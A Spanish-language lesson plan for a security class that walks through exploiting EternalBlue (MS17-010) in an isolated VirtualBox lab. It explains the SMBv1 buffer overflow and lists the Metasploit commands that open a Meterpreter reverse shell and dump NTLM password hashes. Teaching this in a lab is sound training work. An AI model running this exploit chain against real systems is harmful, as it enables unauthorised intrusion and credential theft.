Clase Modelo: EternalBlue / MS17-010

15 min total

Contexto de la Vulnerabilidad ~3 min

EternalBlue (CVE-2017-0143) es un exploit que aprovecha una vulnerabilidad en el protocolo SMBv1 de Windows. Fue desarrollado por la NSA, filtrado por el grupo Shadow Brokers en 2017, y utilizado como vector de propagación en los ataques de ransomware WannaCry y NotPetya.

La vulnerabilidad reside en la forma en que Windows procesa listas de atributos extendidos de archivos (FEA — File Extended Attributes) enviadas a través de SMBv1. Un error aritmético en la función SrvOs2FeaListSizeToNt() permite desbordamiento de buffer controlado en el kernel, lo que lleva a ejecución de código arbitrario sin necesidad de credenciales.

El parche oficial es MS17-010, publicado por Microsoft en marzo de 2017. Los sistemas sin ese parche con SMBv1 activo siguen siendo vulnerables.

Entorno de Laboratorio

  • Atacante: Kali Linux — IP 10.0.2.9
  • Víctima: Metasploitable3 (Windows Server 2008 R2) — IP 10.0.2.15
  • Condición: SMBv1 habilitado, sin parche MS17-010 aplicado
  • Red: VirtualBox NAT Network (aislada)

Fases del Ataque ~3 min

Fase 1 — Reconocimiento

Identificar que el puerto 445 (SMB) está activo y que el sistema ejecuta SMBv1 sin parche. Se usa nmap con scripts de detección de vulnerabilidades: 

sudo nmap --script vuln -p 445 10.0.2.15

Si el sistema es vulnerable, nmap reporta el estado VULNERABLE con referencia a CVE:CVE-2017-0143.

Fase 2 — Acceso Inicial

Explotación remota sin credenciales a través de SMBv1. El exploit envía paquetes especialmente construidos que desbordan el kernel pool del sistema víctima, ejecutando shellcode con privilegios de kernel (NT AUTHORITY\SYSTEM).

Mecánica de Metasploit — Cómo funciona el exploit

1. make_kernel_user_payload — El puente kernel → usuario

EternalBlue da ejecución de código en modo kernel (anillo 0), pero Meterpreter necesita correr en modo usuario (anillo 3). La función make_kernel_user_payload resuelve esto uniendo dos partes:

  • sc — shellcode x64 que corre en modo kernel. Su trabajo: salvar el estado del procesador, navegar la lista de procesos del kernel para encontrar spoolsv.exe por su hash ROR13, inyectar el payload como un APC (Asynchronous Procedure Call) en ese proceso, y restaurar el estado del kernel.
  • ring3 — el payload Meterpreter generado por msfvenom. Se concatena al final del shellcode kernel. El tamaño exacto del Meterpreter está embebido dentro del shellcode del kernel para que sepa cuántos bytes copiar al espacio de usuario.

2. smb_eternalblue — Los 4 pasos del ataque

El módulo ejecuta cuatro pasos en secuencia para explotar el sistema Windows 7 / Server 2008 R2:

  • Step 1: Conectar al share IPC$ vía SMBv1 sin credenciales (login anónimo).
  • Step 2: Enviar un paquete NT_TRANS grande con buffer SMBv1 malformado, inicializando la corrupción del pool.
  • Step 3: Pool grooming — el exploit alterna abrir conexiones SMBv2 (que asignan bloques de ~64KB en el kernel pool) y cerrar conexiones SMBv1 (que liberan bloques), de modo que el buffer a corromper quede adyacente en memoria al buffer que el atacante controla. El parámetro GroomAllocations controla cuántas veces se repite este llenado. Sin este trabajo de ingeniería de memoria, el overflow corrompería memoria aleatoria y el sistema colapsaría (BSOD).
  • Step 4: Enviar el payload con el shellcode.

3. create_fea_list — Donde vive el bug original

FEA (File Extended Attributes) es un concepto heredado del OS/2. Windows Server 2008 aún soporta estas estructuras por compatibilidad. Cuando el servidor recibe una lista FEA vía SMBv1, llama a SrvOs2FeaListSizeToNt() para calcular cuánta memoria necesita. El cálculo tiene un error aritmético: resta un valor DWORD (32 bits) de una variable WORD (16 bits). Si el resultado es negativo, el tipo WORD hace underflow y el resultado se convierte en un número enorme positivo.

El efecto: el kernel cree que el buffer necesita casi 0 bytes, asigna un buffer diminuto, y luego memmove() copia toda la lista FEA dentro de ese buffer demasiado pequeño — overflow controlado. Lo que se escribe fuera del buffer es exactamente fake_srv_net_buf, una estructura falsa que el kernel procesa como real, redirigiendo la ejecución al shellcode.

Pregunta 1: El exploit da ejecucion en modo kernel (anillo 0), pero Meterpreter necesita correr en modo usuario (anillo 3). ¿Que mecanismo usa make_kernel_user_payload para cruzar esa frontera e inyectar Meterpreter en un proceso de usuario?

Laboratorio ~6 min

Paso 0 — Inspeccionar el modulo antes de explotar

Antes de lanzar el exploit, vale la pena ver con que herramienta se trabaja. El comando info muestra la documentacion integrada del modulo: nombre completo, CVEs referenciados, plataformas soportadas, opciones configurables y descripcion tecnica del bug. 

msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
info

Paso 1 — Confirmar la vulnerabilidad

sudo nmap --script vuln -p 445 10.0.2.15

Output esperado:

| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143

Paso 2 — Explotar con Metasploit

msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.15
set LHOST 10.0.2.9
set payload windows/x64/meterpreter/reverse_tcp
run

Output esperado al obtener la shell:

[*] Meterpreter session 1 opened (10.0.2.9:4444 -> 10.0.2.15:XXXXX)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

Nota sobre BSOD: Si el target se reinicia en vez de abrir sesion, es el modo de fallo del exploit, no el exito. EternalBlue corrompe el kernel pool — si el grooming no quedo perfecto, Windows colapsa con BSOD y la VM reinicia. El reboot es senal de intento fallido, no del comportamiento esperado. El modulo tiene MaxExploitAttempts 3 por defecto; a veces toma 2-3 intentos hasta que el pool queda bien acomodado.

Paso 3 — Post-Explotacion con Meterpreter

Con la sesion NT AUTHORITY\SYSTEM abierta, el atacante tiene control total del sistema.

meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump

Output esperado de hashdump:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::

Los hashes NT obtenidos son los mismos que extrae un dump manual via VSS + samdump2, pero aqui se obtienen directamente desde Meterpreter en segundos, sin necesidad de copiar archivos SAM/SYSTEM manualmente. hashdump usa la misma tecnica internamente: lee el hive SAM a traves de una copia en memoria del kernel.

Pregunta 2: El comando getuid devuelve NT AUTHORITY\SYSTEM. ¿Que significa esto en terminos de privilegios dentro de Windows? ¿Por que el exploit obtiene directamente ese nivel de acceso en lugar de un usuario con privilegios restringidos?

Preguntas para la Clase ~1 min

Recapitulacion de las preguntas planteadas durante la clase:

Pregunta 1 (mecanica del exploit): El exploit da ejecucion en modo kernel (anillo 0), pero Meterpreter necesita correr en modo usuario (anillo 3). ¿Que mecanismo usa make_kernel_user_payload para cruzar esa frontera e inyectar Meterpreter en un proceso de usuario?

Respuesta esperada: usa un APC (Asynchronous Procedure Call) para inyectar el payload en spoolsv.exe, que es un proceso de modo usuario. El shellcode kernel navega la lista de procesos del kernel, encuentra spoolsv.exe por su hash ROR13, y encola el APC.
Pregunta 2 (post-explotacion): El comando getuid devuelve NT AUTHORITY\SYSTEM. ¿Que significa esto en terminos de privilegios dentro de Windows? ¿Por que el exploit obtiene directamente ese nivel de acceso en lugar de un usuario con privilegios restringidos?

Respuesta esperada: NT AUTHORITY\SYSTEM es la cuenta con maximos privilegios en Windows, por encima de cualquier cuenta de administrador local. Se obtiene directamente porque el exploit ejecuta codigo en modo kernel — el nivel mas privilegiado del sistema — y el payload hereda ese contexto de seguridad al inyectarse en spoolsv.exe.
